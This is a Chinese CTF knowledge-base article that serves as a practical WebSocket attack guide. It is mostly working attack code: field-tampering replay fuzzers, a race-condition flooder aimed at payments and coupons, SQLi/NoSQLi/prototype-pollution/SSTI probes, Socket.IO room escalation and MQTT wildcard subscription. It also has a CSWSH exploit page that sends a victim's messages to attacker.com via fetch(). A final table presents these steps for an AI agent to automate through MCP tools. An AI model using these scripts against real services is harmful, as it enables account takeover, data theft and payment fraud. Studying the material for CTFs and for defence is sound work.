---
id: "ctf-website/07-client/websocket"
title: "WebSocket 攻击实战"
title_en: "WebSocket Attack Practical Guide"
summary: >
  WebSocket协议攻击完整指南，涵盖消息捕获与字段篡改重放、CSWSH跨域WebSocket劫持、并发竞态攻击、消息注入（SQLi/NoSQLi/prototype pollution/SSTI）、Socket.IO房间越权与事件重放、MQTT物联网协议主题越权，以及wsrepl/websocat/wscat等工具链。
summary_en: >
  Complete WebSocket attack guide covering message capture and field tampering replay, CSWSH cross-site WebSocket hijacking, concurrent race condition attacks, message injection (SQLi/NoSQLi/prototype pollution/SSTI), Socket.IO room privilege escalation and event replay, MQTT IoT topic hijacking, and the wsrepl/websocat/wscat toolchain.
board: "ctf-website"
category: "07-client"
signals: ["WebSocket", "CSWSH", "Socket.IO", "MQTT", "消息注入", "race condition", "跨域WebSocket"]
mcp_tools: ["http_probe", "kb_router"]
keywords: ["WebSocket攻击", "CSWSH", "Socket.IO越权", "MQTT", "消息重放", "跨域WebSocket", "竞态攻击", "WebSocket注入"]
difficulty: "advanced"
tags: ["websocket", "client-side", "injection", "realtime", "ctf"]
language: "zh-CN"
last_updated: "2026-07-04"
related_articles: ["ctf-website/03-injection/graphql", "ctf-website/08-infra/race-cache-smuggling", "ctf-website/12-payment/payment-race-lost-update", "ctf-website/14-idor/01-idor-enumeration", "ctf-website/24-database/02-sqli-advanced"]
---
# WebSocket 攻击实战

## 0. 握手与状态机

WebSocket 的关键不在“能不能连”，而在握手阶段继承了哪些 HTTP 状态，以及连接后事件是否重新鉴权。

```http
GET /ws?room=general HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: <base64>
Sec-WebSocket-Version: 13
Origin: https://target.com
Cookie: session=...
```

| 位置 | 可控字段 | 打点动作 | 命中信号 |
|---|---|---|---|
| Query | `token`, `room`, `uid`, `EIO`, `transport` | 换用户/房间/协议版本 | 握手成功但订阅到其他房间 |
| Header | `Origin`, `Host`, `X-Forwarded-For` | 测 CSWSH、代理信任 | 非同源 Origin 仍 `101` |
| Cookie | `session`, `jwt`, `io` | 旧 token、空 token、跨账号 token | 连接成功后身份错位 |
| First message | `auth`, `join`, `subscribe` | 跳过 auth 或重复 auth | 未认证也收到业务消息 |
| Event state | `seq`, `nonce`, `timestamp` | 重放/乱序/并发 | 重复扣减、重复领取、越权订阅 |

每个 WebSocket case 都先画状态机：

```text
HTTP 101
  → connection_init/auth
  → join/subscribe room
  → business event
  → ack/result/broadcast
```

如果服务端只在 `connection_init` 鉴权，后面的 `join`、`subscribe`、`action` 就是主要突破口。

### 0.1 实时事件到订单/支付/SQL Oracle

实时接口不要只看 `recv` 有没有消息，要把事件字段映射到账户、订单、库存、钱包和数据库查询路径。WebSocket 经常绕开 REST API 的中间件，直接进入 handler、queue consumer 或 GraphQL subscription resolver。

| 事件位置 | 字段 | 变体 | 命中信号 | 下一跳 |
|---|---|---|---|---|
| `join` / `subscribe` | `roomId`, `userId`, `orderId`, `tenantId` | 换成他人 ID、`admin`、`*`、历史订单号 | 收到跨账号 broadcast 或订单状态 | IDOR、GraphQL subscription、订单信息复取 |
| `action` / `event` | `type`, `op`, `method`, `command` | 调后台事件名、旧事件名、debug 事件 | handler 命中、错误栈泄露 resolver 名 | API discovery、SQLi 参数定位 |
| 时序字段 | `seq`, `nonce`, `timestamp`, `version` | 旧值、乱序、重复、未来时间 | 重复 ack、重复入账、覆盖新状态 | payment race、lost update |
| 金额字段 | `amount`, `price`, `balance`, `quantity`, `discount` | `0`, `-1`, 小数精度, 超大数 | 钱包/订单/库存状态改变 | 支付逻辑、数据库约束绕过 |
| 查询字段 | `filter`, `where`, `sort`, `cursor`, `search` | SQL/NoSQL/GraphQL 片段 | SQL error、列名、分页越界 | SQLi advanced、GraphQL resolver |
| 回执字段 | `ack`, `result`, `broadcast`, `error` | 对比 A/B 身份和并发批次 | 只给当前连接成功但全局状态改变 | 持久化状态复读 |

```python
# ws_event_oracle_matrix.py
import asyncio
import csv
import json
import time
import websockets

FIELDS = {
    "roomId": ["admin", "payments", "orders", "*", "../admin"],
    "userId": [0, 1, 2, 999999],
    "orderId": [1, 2, 999999, "' OR '1'='1"],
    "amount": [0, -1, 0.01, 99999999],
    "price": [0, -1, "0.00", "1e309"],
    "seq": [0, 1, -1, 999999999],
    "filter": ["*", "' OR 1=1--", '{"$ne":null}', "id desc"],
}

async def ask(ws, msg, timeout=2):
    await ws.send(json.dumps(msg, separators=(",", ":")))
    try:
        raw = await asyncio.wait_for(ws.recv(), timeout=timeout)
        return raw[:1000]
    except asyncio.TimeoutError:
        return "TIMEOUT"

async def matrix(ws_url, cookie, template, out_csv="exports/ws_event_oracle_matrix.csv"):
    headers = {"Cookie": cookie} if cookie else {}
    rows = []
    async with websockets.connect(ws_url, extra_headers=headers) as ws:
        base_resp = await ask(ws, template)
        rows.append(["baseline", "", json.dumps(template), base_resp, int(time.time())])
        for field, values in FIELDS.items():
            if field not in template:
                continue
            for value in values:
                msg = dict(template)
                msg[field] = value
                resp = await ask(ws, msg)
                rows.append([field, repr(value), json.dumps(msg, ensure_ascii=False), resp, int(time.time())])
    with open(out_csv, "w", newline="", encoding="utf-8") as f:
        csv.writer(f).writerows([["field", "value", "payload", "response", "ts"], *rows])

asyncio.run(matrix(
    "wss://target/ws",
    "session=xxx",
    {"type": "subscribe", "roomId": "orders", "userId": 1001, "orderId": 9001, "seq": 1}
))
```

打完矩阵后立刻读 REST/GraphQL/前端状态页：`/api/orders/<id>`、`/api/wallet`、`/api/payments`、`/api/me`。如果 WebSocket 回了 `ack=false`，但订单、余额或 entitlement 已变化，说明业务副作用先于校验落库；如果返回 SQL error 或列名，直接转 `24-database/02-sqli-advanced`。

## 抓取与重放

```python
# ws_replay.py — WebSocket 消息捕获、修改、重放
import asyncio, websockets, json

async def capture_and_replay(ws_url: str, cookie: str):
    """连接 WebSocket，记录所有消息，然后逐条修改重放"""
    async with websockets.connect(
        ws_url,
        extra_headers={"Cookie": cookie}
    ) as ws:
        messages = []

        # 阶段 1: 正常交互，收集消息
        for _ in range(20):  # 收 20 条消息看看结构
            msg = await asyncio.wait_for(ws.recv(), timeout=5)
            try:
                data = json.loads(msg)
            except:
                data = msg
            messages.append(data)
            print(f"[recv] {json.dumps(data)[:200]}")

        # 阶段 2: 修改关键字段重放
        for msg in messages:
            if isinstance(msg, dict):
                for field in ["role", "userId", "roomId", "targetId", "price",
                              "amount", "isAdmin", "permission", "type", "action"]:
                    if field in msg:
                        original = msg[field]
                        # 尝试越权
                        for malicious_value in ["admin", 0, -1, 999999, "flag"]:
                            msg[field] = malicious_value
                            await ws.send(json.dumps(msg))
                            resp = await asyncio.wait_for(ws.recv(), timeout=2)
                            print(f"  [{field}: {original}→{malicious_value}] {resp[:200]}")
                        msg[field] = original  # 恢复

asyncio.run(capture_and_replay("wss://target.com/ws", "session=xxx"))
```

### A. 状态字段重放脚本

```python
import asyncio, json, websockets

MUTATIONS = {
    "role": ["admin", "owner", "staff"],
    "userId": [0, 1, 2, 999999],
    "roomId": ["admin", "flag", "../admin", "*"],
    "seq": [0, 1, -1, 999999999],
    "amount": [0, 1, -1, 999999],
}

async def replay_with_mutation(ws_url, cookie, template):
    async with websockets.connect(ws_url, extra_headers={"Cookie": cookie}) as ws:
        await ws.send(json.dumps(template))
        print("[base]", await asyncio.wait_for(ws.recv(), timeout=3))
        for field, values in MUTATIONS.items():
            if field not in template:
                continue
            for value in values:
                msg = dict(template)
                msg[field] = value
                await ws.send(json.dumps(msg))
                try:
                    print(field, value, await asyncio.wait_for(ws.recv(), timeout=2))
                except asyncio.TimeoutError:
                    print(field, value, "timeout")

asyncio.run(replay_with_mutation(
    "wss://target/ws",
    "session=xxx",
    {"type": "join", "roomId": "general", "seq": 1}
))
```

成功标志：返回 `ack`、收到原本收不到的 broadcast、服务端状态发生变化、错误从 `unauthorized` 变成业务错误。失败样本：连接直接断开通常是协议层错误；返回业务错误说明已经进 handler。

## 越权字段列表

```python
# WebSocket 消息常见可篡改字段
TAMPER_FIELDS = {
    "auth": ["role", "isAdmin", "isPremium", "userId", "sub", "token", "sessionId", "wsToken"],
    "state": ["roomId", "gameId", "matchId", "targetId", "recipientId", "senderId"],
    "action": ["type", "action", "method", "command", "event"],
    "value": ["amount", "price", "balance", "score", "count", "quantity", "level"],
    "timing": ["timestamp", "seq", "sequence", "version", "counter"],
    "other": ["flag", "debug", "admin", "internal", "secret", "preview"],
}
```

## CSWSH (Cross-Site WebSocket Hijacking)

```python
# 如果 WebSocket 握手只依赖 cookie (无 Origin 检查, 无 CSRF token):
# 攻击者页面可以发起跨域 WebSocket 连接

# 检测:
import requests

def check_origin_check(ws_url: str):
    """测试 Origin 头是否被验证"""
    import websockets, asyncio
    async def test():
        # 正常 Origin
        try:
            async with websockets.connect(ws_url, extra_headers={
                "Origin": "https://target.com"
            }) as ws:
                print("[*] Origin: target.com → connected")
        except: pass

        # 恶意 Origin
        try:
            async with websockets.connect(ws_url, extra_headers={
                "Origin": "https://evil.com"
            }) as ws:
                print("[!] Origin: evil.com → connected (NO ORIGIN CHECK!)")
        except Exception as e:
            print(f"[+] Origin: evil.com → rejected ({e})")
    asyncio.run(test())
```

```html
<!-- CSWSH Exploit HTML (托管在 attacker.com) -->
<script>
var ws = new WebSocket('wss://victim.com/ws');
ws.onmessage = function(e) {
    // 把受害者的消息发给我们
    fetch('https://attacker.com/log?d=' + encodeURIComponent(e.data));
};
ws.onopen = function() {
    ws.send(JSON.stringify({"action": "getFlag"}));
};
</script>
```

### A. SameSite / Origin 判断

| Cookie 属性 | 跨站 WebSocket 是否带 Cookie | 打点结论 |
|---|---|---|
| 未设置 SameSite | 多数浏览器会带 | CSWSH 优先 |
| `SameSite=None; Secure` | HTTPS/WSS 跨站会带 | CSWSH 优先 |
| `SameSite=Lax` | WebSocket 不是顶层导航，通常不带 | 转向 token/query 泄露 |
| `SameSite=Strict` | 不带 | 转向同站子域、XSS、postMessage |

Origin 检查不要只测一个值：

```text
https://target.com
https://evil.com
null
https://target.com.evil.com
https://sub.target.com
http://target.com
```

如果 `evil.com` 被拒但 `target.com.evil.com` 通过，说明服务端用了 `contains()`；如果 `null` 通过，优先找 sandbox iframe、file://、data:// 触发场景。

## 时序/竞态

```python
# WebSocket 特别适合竞态攻击 — 因为消息是异步非阻塞的
async def race_ws(ws, payload: str, count: int = 50):
    """并发发送大量相同消息 (如: 兑换、投票、转账)"""
    tasks = [ws.send(payload) for _ in range(count)]
    await asyncio.gather(*tasks)  # 同时发出
```

## 消息注入

```python
# 如果服务端用文本协议拼接消息 (如: `eval("handle_" + msg.type + "(" + msg.data + ")")`)
# 或者消息通过 JSON 中的某个字段拼到 SQL/OS 命令

INJECTION_PROBES = [
    # SQLi
    '{"type": "chat", "msg": "\' OR \'1\'=\'1"}',
    # NoSQLi
    '{"type": "lookup", "id": {"$gt": ""}}',
    # prototype pollution
    '{"type": "update", "__proto__": {"isAdmin": true}}',
    # SSTI (如果服务端模板化处理消息内容)
    '{"type": "render", "template": "{{7*7}}"}',
]
```

## Socket.IO 专用攻击

```python
# Socket.IO 不同于裸 WebSocket — 有命名空间和事件系统
import socketio

sio = socketio.Client()

@sio.on('connect')
def on_connect():
    print('[+] Connected')
    # 越权: 加入其他房间
    sio.emit('join', {'room': 'admin_room'})
    sio.emit('join', {'room': 'flag'})

@sio.on('message')
def on_message(data):
    print(f'[recv] {data}')

sio.connect('https://target.com', transports=['websocket'])

# Socket.IO 特有攻击面:
# 1. 房间越权: emit('join', {room: 'admin'}) — 没有服务端鉴权
# 2. 事件重放: 直接 emit admin 专用事件 (如: 'get_flag', 'read_config')
# 3. 命名空间切换: /admin vs / 可能有不同权限
# 4. 认证 token 在握手 query: ?token=xxx  — URL 泄露
```

### A. Socket.IO 帧格式

Socket.IO 在 WebSocket 上又包了一层协议。看到 `0`, `40`, `42` 这些前缀时，不要按普通 JSON 处理。

| 帧 | 含义 | 示例 |
|---|---|---|
| `0{...}` | Engine.IO open | `0{"sid":"abc","upgrades":[]}` |
| `40` | Socket.IO connect | `40` |
| `40/admin,{...}` | 连接 namespace | `40/admin,{"token":"x"}` |
| `42[...]` | event | `42["join",{"room":"admin"}]` |
| `43[...]` | ack event | `43["ok"]` |
| `2` / `3` | ping / pong | 心跳 |

手工重放：

```bash
websocat 'wss://target/socket.io/?EIO=4&transport=websocket' \
  -H='Cookie: session=xxx'
# 发送:
# 40
# 42["join",{"room":"admin"}]
# 42["get_flag",{}]
```

Socket.IO 的突破点通常在 namespace 和 room：

```python
for ns in ["/", "/admin", "/internal", "/debug"]:
    try:
        sio.connect("https://target.com", namespaces=[ns], transports=["websocket"])
        print("[ns ok]", ns)
    except Exception as e:
        print("[ns fail]", ns, e)
```

## MQTT/物联网 WebSocket

```python
# MQTT over WebSocket — 常见于 IoT 场景
# ws://target.com:8083/mqtt
# 认证: username/password 或 JWT

import paho.mqtt.client as mqtt

mqtt.Client(transport='websockets').connect('target.com', 8083)
# 主题越权:
#   订阅 # (所有主题)
#   订阅 $SYS/# (系统主题 — 可能泄露配置)
#   发布到 admin/+/cmd 主题
```

## 工具命令

```bash
# wsrepl — 交互式 WebSocket REPL
pip install wsrepl
wsrepl wss://target.com/ws

# websocat — curl for WebSocket
websocat wss://target.com/ws -H="Cookie: session=xxx"

# wscat — node.js WebSocket 客户端
npm install -g wscat
wscat -c wss://target.com/ws -H "Cookie: session=xxx"

# wsdump.py — 捕获 WebSocket 帧
python3 wsdump.py wss://target.com/ws

# Burp → Repeater → WebSocket
# Chrome DevTools → Network → WS → Messages
```

## 攻击链

```
WebSocket → 消息重放 → 修改 role → 鉴权绕过
WebSocket → CSWSH → 跨域连接 → 读取受害者实时消息
WebSocket → 并发竞态 → 优惠码 50 次 → 余额溢出
Socket.IO → 房间越权 → join admin_room → 实时监听 flag
MQTT → subscribe # → 监听所有主题 → IoT 配置/密码泄露
WebSocket → 消息注入 → SQLi/NoSQLi → 拖库
WebSocket → 时序攻击 → 先改状态再验证 → 竞态绕过
WebSocket → subscription 越权 → 监听订单/支付 broadcast → 支付回调参数复用
WebSocket → filter/orderBy 注入 → SQL error/列名 → 数据库枚举
```

## Evidence

记录: 握手请求头、`101` 响应头、Origin 变体、Cookie/SameSite、第一条认证消息、收发消息 JSON/text、`exports/ws_event_oracle_matrix.csv`、修改字段后的响应差异、Socket.IO namespace/room/event、竞态并发数、订单/钱包/支付状态读数、SQL error 或 resolver 名。

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| WebSocket 端点探测 | `http_probe` | HTTP GET 探测 WebSocket 握手端点 |
| 知识检索 | `kb_router` | 按 WebSocket 攻击信号搜索知识库 |
